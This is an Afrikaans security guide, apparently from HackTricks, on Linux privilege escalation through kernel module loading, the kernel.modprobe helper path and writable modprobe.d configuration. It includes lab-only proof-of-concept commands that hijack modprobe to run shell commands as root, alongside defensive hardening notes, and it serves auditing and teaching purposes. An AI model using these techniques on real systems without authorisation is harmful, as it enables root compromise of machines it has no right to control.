# Misbruik van Kernel Modules en modprobe

{{#include ../../banners/hacktricks-training.md}}

## Wanopstellings van kernel-module- en module-laai

Ondersteuning vir kernel modules is ’n hoë-impak-area tydens ’n Linux privilege escalation-oorsig. Moenie elke unsigned-module-boodskap op sigself as exploiteerbaar beskou nie, maar gebruik dit om praktiese vrae te beantwoord.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Kan die huidige gebruiker modules deur `sudo`, capabilities of ’n skryfbare helper path laai?
- Is module loading steeds enabled?
- Is module signature enforcement disabled?
- Is module directories, module files of `modprobe.d`-configuration paths skryfbaar?<sup>[[16]](#references)</sup>
- Kan kernel logs gelees word om te bevestig wat gebeur het?

Vinnige triage begin met die volgende module-status-, signature-, logging- en module-tree-checks.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretasie:

- `modules_disabled=1` beteken dat modules nie gelaai of verwyder kan word nie, en die waarde kan nie tot `0` teruggestel word voordat die stelsel herlaai is nie.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` op die kernel command line, of `CONFIG_MODULE_SIG_FORCE=y`, vereis geldig ondertekende modules; andersins kan ongetekende modules gelaai word en die kernel taint.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` plaas geen beperking op `dmesg` nie; wanneer dit `1` is, vereis toegang `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Skryfbare paaie onder `/lib/modules/$(uname -r)/` is gevaarlik omdat `modprobe` daardie boomstruktuur en sy afhanklikheidsdata deursoek wanneer modules gelaai word.<sup>[[8]](#references)</sup>

### Laai van 'n module en lees van kernuitset

As jy wettige toestemming het om 'n plaaslike module te laai, voeg `insmod` die presiese `.ko`-lêer wat jy verskaf in. Die module se init-funksie loop as deel van die laaiproses, en boodskappe wat met `printk()` geskryf word, gaan na die kernel-logbuffer, wat gewoonlik met `dmesg` gelees word.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

'n Minimale hersieningswerkvloei gebruik `modinfo` om metadata te inspekteer, `insmod` en `rmmod` om 'n module te laai en te verwyder, `lsmod` om die gelaaide toestand te bevestig, en `dmesg` om kernel-logboeke te inspekteer.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
As `sudo -l` `insmod`, `modprobe`, of 'n wrapper rondom hulle toelaat, beskou dit as krities: `sudo -l` lys die aanroepende gebruiker se voorregte, en die laai van 'n kernel module vereis `CAP_SYS_MODULE`. Sien [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) vir direkte capability-gebaseerde paaie.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-toegelate `insmod`

'n Sudo-reël wat 'n gebruiker toelaat om `insmod` uit te voer, is nie vergelykbaar met toestemming om 'n normale administratiewe helper uit te voer nie. Die module se initialiseringskode loop as deel van die invoeging, dus is die praktiese hersieningsvraag of hierdie gebruiker die module wat gelaai word, kan kies of wysig.<sup>[[3]](#references)</sup>

Die volgende generiese hersieningsvloei herhaal daardie inspeksie-, laai-, toestand-, log- en verwyderingskontroles vir 'n kandidaatmodule.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
As die gebruiker ’n arbitrêre `.ko` kan verskaf, moet die reël in ’n gemagtigde assessering as ’n volledige kompromittering van die stelsel beskou word. ’n Veiliger operasionele patroon is om te vermy dat module-laai deur sudo gedelegeer word; indien dit onvermydelik is, beperk die presiese pad, eienaarskap, toestemmings, ondertekeningsbeleid en verwyderingswerkvloei.<sup>[[3]](#references)[[10]](#references)</sup>

Vir ’n onskadelike module-boupatroon in ’n beheerde laboratorium word ’n minimale bron en Makefile hieronder gewys; die `make -C /lib/modules/$(uname -r)/build M=$PWD`-vorm volg die kernel se gedokumenteerde kbuild-werkvloei vir eksterne modules.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Bou en laai slegs in ’n gemagtigde laboratorium; kbuild bou die eksterne module, en die laai-/verwyder-opdragte roep die kernmodule-koppelvlakke aan.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path`-misbruikkontroles

`kernel.modprobe` spesifiseer die userspace helper wat die kernel uitvoer vir module-autoload-versoeke; hierdie sysctl beïnvloed autoloading, nie eksplisiete module-invoeging nie. As 'n aanvaller dit na 'n writable executable path kan verander en 'n moduleversoek kan aktiveer, word daardie helper 'n bevoorregte code-execution path. Deur dit op die leë string te stel, word autoload-versoeke gedeaktiveer; indien `CONFIG_STATIC_USERMODEHELPER=y`, word 'n nie-leë waarde deur die compiled-in static helper path oorskryf.<sup>[[1]](#references)</sup>

Kontroleer die huidige helper path deur die kernel sysctl-koppelvlak en inspekteer die teiken se eienaarskap en mode.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Kontroleer of die sysctl, gedelegeerde sudo-reëls of lêervermoëns beïnvloed kan word.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Die volgende patroon, slegs vir laboratoriumgebruik, verander die helper-pad en aktiveer ’n gedokumenteerde module-autoload-versoek; gebruik dit slegs op ’n geïsoleerde, gemagtigde stelsel.<sup>[[1]](#references)</sup>

Op huidige Linux-kernels, moenie ’n onbekende uitvoerbare lêer as ’n generiese sneller gebruik nie: legacy custom binary-format module-autoloading is in Linux 6.14 verwyder, terwyl die kernel-dokumentasie ’n onbekende lêerstelseltipe as ’n module-autoload-versoekpad identifiseer.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Op geharde stelsels behoort dit te misluk wanneer toestemmings onvoorregte writes na `kernel.modprobe` voorkom, die helper path nie skryfbaar is nie, of module-autoloading gedeaktiveer is.<sup>[[1]](#references)</sup>

### Skryfbare `modprobe.d`-konfigurasie en `sudo modprobe -C`

Voordat `modprobe` ’n module oplos, lees dit `.conf`-lêers uit konfigurasiegidse soos `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` en `/lib/modprobe.d`, in prioriteitsvolgorde. ’n Lêer met dieselfde naam in ’n gids met hoër prioriteit verberg die lêer met laer prioriteit. Belangriker nog, ’n `install <module> <command>`-direktief voer ’n arbitrêre shell command uit **in plaas daarvan om** daardie module in te voeg. Daarom kan ’n skryfbare konfigurasiepad delayed command execution word onder die credentials van ’n latere bevoorregte `modprobe`-caller; kernel module signature enforcement authenticateer nie hierdie userspace command nie.<sup>[[16]](#references)</sup>

Oudit gids- en lêertoestemmings, en inspekteer dan die effektiewe konfigurasie. `modprobe -n -v` is veilig vir resolusiehersiening omdat dry-run mode nie die module invoeg of ’n `install`/`remove`-command uitvoer nie. Verkies `modprobe -c` bo die legacy `--showconfig`-spelling, wat huidige kmod-dokumentasie aandui vir verwydering ná kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
'n Onbeperkte sudo-reël vir `modprobe` is uitbuitbaar selfs wanneer arbitrêre `.ko`-lêers nie handtekeningverifikasie kan slaag nie: `-C` kies 'n aanvaller-beheerde konfigurasiegids, waaruit 'n `install`-opdrag deur die sudo-geloodsde proses uitgevoer kan word.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
Vir versagting, moenie `modprobe` met onbeperkte argumente via sudo toestaan nie, hou elke konfigurasiegids root-owned en nie-skryfbaar nie, en hersien onverwagte `install`-/`remove`-direktiewe. Wanneer ’n vertroude administratiewe werkvloei sulke direktiewe vir een module moet omseil, ignoreer `modprobe --ignore-install` dit vir daardie benoemde module, maar afhanklikhede kan steeds hul eie commands hê.<sup>[[8]](#references)[[16]](#references)</sup>

### Hersiening van skryfbare `/lib/modules`

Skryfbare modulegidse kan modulevervanging, die planting van malicious modules of auto-load-misbruik moontlik maak, afhangend van hoe `modprobe` later aangeroep word; `modprobe` soek in `/lib/modules/$(uname -r)` en gebruik die dependency-data daarvan wanneer modules opgelos word.<sup>[[8]](#references)</sup>

Hersien skryfbare modulelêers en dependency-/alias-metadata onder die aktiewe kernelvrystelling se moduleboom.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Indien jy skryfbare module-inhoud vind, ondersoek hoe `modprobe` afhanklikhede oplos en hoe `modinfo` modulemetadata rapporteer.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Defensiewe notas:

- Hou `/lib/modules` in besit van `root:root` en nie-skryfbaar vir users nie.<sup>[[8]](#references)</sup>
- Stel `kernel.modules_disabled=1` na boot waar dit operasioneel moontlik is.<sup>[[1]](#references)</sup>
- Dwing module signing af op stelsels wat loadable modules vereis.<sup>[[2]](#references)</sup>
- Monitor writes na `/proc/sys/kernel/modprobe`, `/lib/modules` en die `modprobe.d`-konfigurasiegidse, asook onverwagte uitvoering van `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [Dokumentasie vir /proc/sys/kernel/ — Die Linux Kernel-dokumentasie](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing facility — Die Linux Kernel-dokumentasie](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver Basics — Die Linux Kernel-dokumentasie](https://docs.kernel.org/driver-api/basics.html)
- [6] [Message logging with printk — Die Linux Kernel-dokumentasie](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Building External Modules — Die Linux Kernel-dokumentasie](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
